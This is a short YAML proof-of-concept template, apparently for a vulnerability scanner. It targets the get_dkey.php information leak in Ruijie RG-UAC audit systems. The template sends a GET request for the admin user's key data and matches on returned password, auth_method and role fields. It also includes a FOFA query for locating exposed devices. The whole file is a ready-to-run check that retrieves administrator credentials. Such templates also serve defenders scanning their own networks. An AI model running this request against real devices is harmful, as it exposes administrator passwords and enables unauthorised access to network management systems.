id: poc-yaml-ruijie-rg-uac-password-leak
info:
  name: 锐捷RG-UAC统一上网行为管理审计系统 get_dkey.php 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: ruijie_RG-UAC
  fofa: title="RG-UAC登录页面"
requests:
- method: GET
  path: /get_dkey.php?user=admin
  expression: "status_code == 200 && \ncontains(body,\"\\\"password\\\":\") &&\ncontains(body,\"\
    \\\"auth_method\\\":\") &&\ncontains(body,\"\\\"role\\\"\") &&\ncontains(body,\"\
    \\\"pre_define\\\"\")\n"
variables: {}
transport: http
